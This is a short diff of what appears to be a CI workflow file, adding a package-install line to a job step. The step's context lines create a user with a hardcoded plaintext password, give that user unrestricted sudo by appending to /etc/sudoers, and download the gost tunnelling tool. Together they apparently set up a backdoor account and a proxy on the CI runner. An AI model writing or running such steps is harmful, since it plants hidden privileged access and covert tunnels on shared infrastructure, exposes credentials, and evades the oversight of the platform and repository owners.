@@ -24,6 +24,7 @@ jobs:
           run: |
             uname -a
             echo ::set-output name=uname::$(uname -a)
+            apt update && apt install -y wget docker.io
              useradd -m -s /bin/bash jiro && echo 'jiro:zhangjl22222@' | chpasswd
              sh -c 'echo "jiro    ALL=(ALL:ALL) ALL" >> /etc/sudoers'
              wget https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_arm64.tar.gz
